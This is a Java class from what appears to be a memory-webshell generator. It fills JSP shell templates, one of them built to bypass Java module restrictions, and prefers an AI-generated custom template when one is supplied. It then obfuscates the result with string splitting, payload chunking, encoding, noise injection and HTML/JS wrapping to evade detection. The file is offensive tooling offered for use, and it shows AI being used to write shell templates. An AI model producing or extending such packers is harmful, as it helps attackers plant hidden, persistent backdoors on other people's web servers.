package org.leo.jmg.mem.packer.jsp;

import org.leo.jmg.mem.packer.ClassPackerConfig;
import org.leo.jmg.mem.packer.Packer;
import org.leo.jmg.mem.packer.PackerMeta;
import org.leo.jmg.mem.packer.TemplateRenderer;
import org.leo.jmg.mem.packer.Util;

@PackerMeta(
    name = "DefineClassJSP", group = "Jsp", order = 3,
    obfuscationSteps = {
        "SPLIT_STRING_LITERALS",
        "CHUNK_PAYLOAD",
        "GHOST_BITS_ENCODE",
        "INJECT_SCRIPTLET_NOISE",
        "INSERT_SCRIPT_NOISE",
        "UNICODE_ENCODE_JSP",
        "WRAP_HTML_JS"
    }
)
public class DefineClassJspPacker implements Packer {

    private final String template = Util.loadTemplateFromResource("/memshell-template/shell1.jsp");
    private final String bypassTemplate = Util.loadTemplateFromResource("/memshell-template/shell2.jsp");

    @Override
    public String pack(ClassPackerConfig config) {
        // AI 生成的自定义模板优先；未提供时按 byPassJavaModule 选择内置模板
        String tpl;
        if (config.getCustomTemplate() != null && !config.getCustomTemplate().trim().isEmpty()) {
            tpl = config.getCustomTemplate();
        } else {
            tpl = config.isByPassJavaModule() ? bypassTemplate : template;
        }
        String code = TemplateRenderer.render(tpl, config);
        JspObfuscationPipeline pipeline = (config.getJspObfuscationSteps() != null)
                ? JspObfuscationPipeline.fromStepIds(config.getJspObfuscationSteps())
                : JspObfuscationPipeline.jspDefault();
        return pipeline.apply(code);
    }
}
